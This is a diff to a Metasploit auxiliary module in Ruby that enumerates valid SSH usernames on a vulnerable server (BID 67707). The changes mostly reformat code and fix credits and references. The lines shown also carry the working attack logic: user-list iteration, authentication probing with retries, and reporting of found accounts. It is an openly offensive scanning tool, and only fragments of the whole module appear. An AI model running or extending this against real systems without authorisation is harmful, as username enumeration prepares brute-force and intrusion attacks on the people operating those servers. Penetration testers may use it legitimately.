@@ -21,10 +21,13 @@ class Metasploit3 < Msf::Auxiliary
         in the way the SSH service handles failed logins for valid and invalid
         users.  This issue was discovered by Steve Embling.
       },
-      'Author'      => ['Matt Byrne <attackdebris [at] gmail.com>'],
+      'Author'      => [
+        'Steve Embling', # Discovery
+        'Matt Byrne <attackdebris [at] gmail.com>' # Metasploit module
+      ],
       'References'     =>
         [
-          [ 'URL',  'http://xforce.iss.net/xforce/alerts/id/166' ],
+          [ 'URL',  'http://xforce.iss.net/xforce/xfdb/93546' ],
           [ 'BID', '67707']
         ],
       'License'     => MSF_LICENSE,
@@ -34,22 +37,23 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(22),
-        OptPath.new('USER_FILE',
-                    [true, 'Files containing usernames, one per line', nil])
+        OptPath.new(
+          'USER_FILE',
+          [true, 'Files containing usernames, one per line', nil])
       ], self.class
     )
 
     register_advanced_options(
       [
-        OptInt.new('RETRY_NUM',
-                   [true , 'The number of attempts to connect to a SSH server' \
-                   ' for each user', 3]),
-        OptInt.new('SSH_TIMEOUT',
-                   [true, 'Specify the maximum time to negotiate a SSH session',
-                   10]),
-        OptBool.new('SSH_DEBUG',
-                    [false, 'Enable SSH debugging output (Extreme verbosity!)',
-                    false])
+        OptInt.new(
+          'RETRY_NUM',
+          [true , 'The number of attempts to connect to a SSH server for each user', 3]),
+        OptInt.new(
+          'SSH_TIMEOUT',
+          [true, 'Specify the maximum time to negotiate a SSH session', 10]),
+        OptBool.new(
+          'SSH_DEBUG',
+          [true, 'Enable SSH debugging output (Extreme verbosity!)', false])
       ]
     )
   end
@@ -107,15 +111,14 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
-      auth.authenticate("ssh-connection", user, pass)
-      auth_method = auth.allowed_auth_methods.join('|')
-      if auth_method != ''
-        :success
-      else
-        :fail
+        auth.authenticate("ssh-connection", user, pass)
+        auth_method = auth.allowed_auth_methods.join('|')
+        if auth_method != ''
+          :success
+        else
+          :fail
+        end
       end
-      end
-    end
     rescue Rex::ConnectionError, Rex::AddressInUse
       return :connection_error
     rescue Net::SSH::Disconnect, ::EOFError
@@ -124,6 +127,7 @@ class Metasploit3 < Msf::Auxiliary
       return :success
     rescue Net::SSH::Exception
     end
+  end
 
   def do_report(ip, user, port)
     report_auth_info(
@@ -151,7 +155,7 @@ class Metasploit3 < Msf::Auxiliary
     attempt_num = 0
     ret = nil
 
-    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)
+    while (attempt_num <= retry_num) && (ret.nil? || ret == :connection_error)
       if attempt_num > 0
         Rex.sleep(2 ** attempt_num)
         print_debug "#{peer(ip)} Retrying '#{user}' due to connection error"
@@ -170,10 +174,10 @@ class Metasploit3 < Msf::Auxiliary
       print_good "#{peer(ip)} User '#{user}' found"
       do_report(ip, user, rport)
     when :connection_error
-      print_error "#{peer(ip)} User '#{user}' on could not connect"
+      print_error "#{peer(ip)} User '#{user}' could not connect"
     when :fail
-      print_debug "#{peer(ip)} User '#{user}' not found"
-   end
+      print_verbose "#{peer(ip)} User '#{user}' not found"
+    end
   end
 
   def run_host(ip)
@@ -184,7 +188,10 @@ class Metasploit3 < Msf::Auxiliary
     else
       print_status "#{peer(ip)} Vulnerable"
       print_status "#{peer(ip)} Starting scan"
-      user_list.each{ |user| show_result(attempt_user(user, ip), user, ip) }
+      user_list.each do |user|
+        show_result(attempt_user(user, ip), user, ip)
+      end
     end
   end
 end
+
